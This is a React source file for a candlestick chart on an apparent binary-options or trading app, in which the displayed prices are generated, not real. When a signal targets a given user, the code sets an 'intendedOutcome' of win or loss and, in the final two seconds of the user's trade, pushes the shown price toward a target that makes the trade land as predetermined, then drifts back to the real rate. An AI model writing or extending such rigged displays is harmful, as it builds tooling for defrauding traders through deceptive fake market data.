import React, { useEffect, useRef, forwardRef, useImperativeHandle } from 'react';
import { createChart } from 'lightweight-charts';

const LightweightChart = forwardRef(({ symbol, interval, currentRate, activeSignal, user, isTrading, tradeDirection, intendedOutcome, onCandlesUpdate }, ref) => {
    const chartContainerRef = useRef(null);
    const chartRef = useRef(null);
    const seriesRef = useRef(null);
    const candlesDataRef = useRef([]);
    const updateIntervalRef = useRef(null);

    // Use REFS for all trading-state values read inside the interval
    // This avoids stale closure issues entirely
    const isTradingRef = useRef(false);
    const tradeDirectionRef = useRef(null);
    const intendedOutcomeRef = useRef(null);
    const activeSignalRef = useRef(activeSignal);
    const currentRateRef = useRef(currentRate);

    // Persistent signal state
    const signalStateRef = useRef({
        isActive: false,
        startTime: null,
        endTime: null,
        targetPrice: null,
        lastPriceAtPushStart: null,
        pushStarted: false
    });

    // Sync all props to refs on every render (no re-renders inside interval)
    useEffect(() => { isTradingRef.current = isTrading; }, [isTrading]);
    useEffect(() => { tradeDirectionRef.current = tradeDirection; }, [tradeDirection]);
    useEffect(() => { intendedOutcomeRef.current = intendedOutcome; }, [intendedOutcome]);
    useEffect(() => { activeSignalRef.current = activeSignal; }, [activeSignal]);
    useEffect(() => { currentRateRef.current = currentRate; }, [currentRate]);

    // Signal activation effect — fires when trade starts or signal changes
    useEffect(() => {
        const sig = activeSignal;
        const isUserTargeted = !!(sig?.isActive &&
            new Date(sig?.expiresAt) > new Date() &&
            sig.affectedUsersMap?.[user?.id] &&
            sig.symbol === symbol);

        // CRITICAL: Only initialize when intendedOutcome is known (not null).
        // setTrading(true) fires before the async Firestore fetch completes,
        // so intendedOutcome arrives ~300-500ms later. We must wait for it.
        if (isUserTargeted && isTrading && intendedOutcome !== null) {

            // Re-initialize whenever intendedOutcome changes (e.g. first was null, now 'win')
            // or when trade first starts with a valid outcome
            const shouldInit = !signalStateRef.current.isActive ||
                signalStateRef.current.intendedOutcomeUsed !== intendedOutcome;

            if (shouldInit) {
                const lastCandle = candlesDataRef.current[candlesDataRef.current.length - 1];
                const startPrice = lastCandle?.close || parseFloat(String(currentRate || '73000').replace(/,/g, ''));

                const userConfig = sig.affectedUsersMap?.[user?.id];
                const payoutRate = parseInt(userConfig?.payoutRate ?? 85, 10);

                // Direction logic:
                // BUY + win  → price UP   (user profits from rise)
                // BUY + loss → price DOWN  (user loses on rise)
                // SELL + win  → price DOWN (user profits from drop)
                // SELL + loss → price UP   (user loses on drop)
                const isWin = intendedOutcome === 'win';
                const moveDir = (tradeDirection === 'BUY')
                    ? (isWin ? 1 : -1)
                    : (isWin ? -1 : 1);

                // Visual move magnitude: proportional to payout %
                // e.g. 85% payout → ~1.3% visible price move in 2 seconds
                const moveRatio = (payoutRate / 100) * 0.015;
                const targetPrice = startPrice * (1 + moveRatio * moveDir);

                signalStateRef.current = {
                    isActive: true,
                    startTime: Date.now(),
                    endTime: Date.now() + 10000, // 10s from NOW (re-syncs if intendedOutcome arrives late)
                    targetPrice,
                    intendedOutcomeUsed: intendedOutcome,
                    pushStarted: false,
                    lastPriceAtPushStart: null
                };

                console.log('[Chart] Signal INIT →', {
                    tradeDirection, intendedOutcome, isWin, moveDir,
                    startPrice: startPrice.toFixed(4),
                    targetPrice: targetPrice.toFixed(4)
                });
            }

        } else if (!isTrading) {
            // Trade ended - deactivate
            if (signalStateRef.current.isActive) {
                signalStateRef.current.isActive = false;
                signalStateRef.current.pushStarted = false;
                console.log('[Chart] Signal DEACTIVATED (trade ended)');
            }
        } else if (!isUserTargeted) {
            signalStateRef.current.isActive = false;
        }
    }, [activeSignal, isTrading, tradeDirection, intendedOutcome, symbol, user?.id]);

    // Expose methods to parent
    useImperativeHandle(ref, () => ({
        getCandles: () => candlesDataRef.current,
    }));

    const getIntervalSeconds = (iv) => {
        const map = { '1': 60, '5': 300, '15': 900, '30': 1800, '60': 3600, 'D': 86400, 'W': 604800 };
        return map[iv] || 60;
    };

    const generateInitialCandles = (basePrice, count = 60) => {
        const candles = [];
        const intervalSeconds = getIntervalSeconds(interval);
        const now = Math.floor(Date.now() / 1000);
        let price = basePrice;

        for (let i = count; i > 0; i--) {
            const time = now - (i * intervalSeconds);
            const volatility = price * 0.0015;
            const open = price;
            const close = open + (Math.random() - 0.5) * volatility;
            const high = Math.max(open, close) + Math.random() * volatility * 0.4;
            const low = Math.min(open, close) - Math.random() * volatility * 0.4;
            candles.push({
                time,
                open: parseFloat(open.toFixed(6)),
                high: parseFloat(high.toFixed(6)),
                low: parseFloat(low.toFixed(6)),
                close: parseFloat(close.toFixed(6))
            });
            price = close;
        }
        return candles;
    };

    useEffect(() => {
        const container = chartContainerRef.current;
        if (!container) return;

        if (updateIntervalRef.current) {
            clearInterval(updateIntervalRef.current);
            updateIntervalRef.current = null;
        }
        if (chartRef.current) {
            chartRef.current.remove();
            chartRef.current = null;
            seriesRef.current = null;
        }

        const chart = createChart(container, {
            width: container.clientWidth,
            height: container.clientHeight || 400,
            layout: {
                background: { type: 'solid', color: '#000000' },
                textColor: '#d1d4dc',
            },
            grid: {
                vertLines: { color: '#0d0d0d' },
                horzLines: { color: '#0d0d0d' },
            },
            crosshair: { mode: 1 },
            rightPriceScale: {
                borderColor: '#1b1b1b',
                textColor: '#888888',
            },
            timeScale: {
                borderColor: '#1b1b1b',
                textColor: '#888888',
                timeVisible: true,
                secondsVisible: false,
            },
            handleScroll: true,
            handleScale: true,
        });

        chartRef.current = chart;

        const series = chart.addCandlestickSeries({
            upColor: '#00c087',
            downColor: '#ff4d4f',
            borderVisible: false,
            wickUpColor: '#00c087',
            wickDownColor: '#ff4d4f',
        });
        seriesRef.current = series;

        const rawPrice = currentRate ? parseFloat(String(currentRate).replace(/,/g, '')) : 73000;
        const basePrice = isNaN(rawPrice) ? 73000 : rawPrice;

        const initialCandles = generateInitialCandles(basePrice);
        candlesDataRef.current = initialCandles;
        series.setData(initialCandles);
        chart.timeScale().fitContent();

        if (onCandlesUpdate) onCandlesUpdate(initialCandles);

        // Always tick at 1000ms — fast enough for the 2-second push to look smooth
        const TICK_MS = 1000;

        updateIntervalRef.current = setInterval(() => {
            if (!seriesRef.current || candlesDataRef.current.length === 0) return;

            const sigState = signalStateRef.current;
            const lastCandle = candlesDataRef.current[candlesDataRef.current.length - 1];
            const nowMs = Date.now();
            const nowSec = Math.floor(nowMs / 1000);
            const intervalSeconds = getIntervalSeconds(interval);
            const lastPrice = lastCandle.close;
            const realPrice = currentRateRef.current
                ? parseFloat(String(currentRateRef.current).replace(/,/g, ''))
                : lastPrice;

            let newClose;

            if (sigState.isActive) {
                const remaining = sigState.endTime - nowMs;
                const PUSH_THRESHOLD = 2000; // Last 2 seconds

                if (remaining <= PUSH_THRESHOLD && remaining > -500) {
                    // ─── FINAL PUSH PHASE (Last 2 Seconds) ───
                    // Record the price at which push started (no jump)
                    if (!sigState.pushStarted) {
                        signalStateRef.current.lastPriceAtPushStart = lastPrice;
                        signalStateRef.current.pushStarted = true;
                        console.log('[Chart] Push phase started at price:', lastPrice.toFixed(4), '→ target:', sigState.targetPrice.toFixed(4));
                    }

                    // Strong pull toward target — must reach it in 2 ticks (2 seconds)
                    // With moveSpeed=0.8: tick1 = 80% of gap closed, tick2 = 96% closed
                    const moveSpeed = 0.82;
                    const gap = sigState.targetPrice - lastPrice;
                    newClose = lastPrice + gap * moveSpeed;

                } else if (remaining > PUSH_THRESHOLD) {
                    // ─── ORGANIC WAITING PHASE (First 8 Seconds) ───
                    // Follow real market smoothly, no manipulation yet
                    const followSpeed = 0.08;
                    const drift = isNaN(realPrice - lastPrice) ? 0 : (realPrice - lastPrice) * followSpeed;
                    const volatility = lastPrice * 0.00012;
                    newClose = lastPrice + drift + (Math.random() - 0.5) * volatility;

                } else {
                    // ─── POST-TRADE RECOVERY ───
                    // Gently drift back to real market price
                    signalStateRef.current.isActive = false;
                    const followSpeed = 0.12;
                    newClose = lastPrice + (realPrice - lastPrice) * followSpeed;
                }
            } else {
                // ─── NORMAL MARKET MODE ───
                const followSpeed = 0.15;
                const diff = isNaN(realPrice - lastPrice) ? 0 : realPrice - lastPrice;
                const drift = diff * followSpeed;
                const volatility = lastPrice * (0.0003 + Math.random() * 0.0002);
                newClose = lastPrice + drift + (Math.random() - 0.5) * volatility;
            }

            // Protect against NaN
            if (isNaN(newClose) || newClose <= 0) newClose = lastPrice;

            const moveSize = Math.abs(newClose - lastPrice);
            const wickSize = moveSize * (0.3 + Math.random() * 0.8);
            const newHigh = Math.max(lastPrice, newClose) + wickSize;
            const newLow = Math.min(lastPrice, newClose) - wickSize;

            if (nowSec - lastCandle.time >= intervalSeconds) {
                // New candle
                const newCandle = {
                    time: nowSec,
                    open: parseFloat(lastPrice.toFixed(6)),
                    high: parseFloat(newHigh.toFixed(6)),
                    low: parseFloat(newLow.toFixed(6)),
                    close: parseFloat(newClose.toFixed(6)),
                };
                candlesDataRef.current.push(newCandle);
                if (candlesDataRef.current.length > 500) candlesDataRef.current.shift();
                seriesRef.current.setData(candlesDataRef.current);
                if (onCandlesUpdate) onCandlesUpdate(candlesDataRef.current);
            } else {
                // Update current candle
                const updated = {
                    ...lastCandle,
                    high: parseFloat(Math.max(lastCandle.high, newHigh).toFixed(6)),
                    low: parseFloat(Math.min(lastCandle.low, newLow).toFixed(6)),
                    close: parseFloat(newClose.toFixed(6)),
                };
                candlesDataRef.current[candlesDataRef.current.length - 1] = updated;
                seriesRef.current.update(updated);
                if (onCandlesUpdate) onCandlesUpdate(candlesDataRef.current);
            }
        }, TICK_MS);

        const handleResize = () => {
            if (container && chartRef.current) {
                chartRef.current.applyOptions({ width: container.clientWidth, height: container.clientHeight || 400 });
            }
        };
        window.addEventListener('resize', handleResize);

        return () => {
            window.removeEventListener('resize', handleResize);
            if (updateIntervalRef.current) clearInterval(updateIntervalRef.current);
            if (chartRef.current) {
                chartRef.current.remove();
                chartRef.current = null;
                seriesRef.current = null;
            }
        };
    }, [symbol, interval]); // Chart only rebuilds when asset or timeframe changes

    return (
        <div
            ref={chartContainerRef}
            style={{ width: '100%', height: '100%', minHeight: '300px', position: 'relative' }}
        />
    );
});

LightweightChart.displayName = 'LightweightChart';
export default LightweightChart;
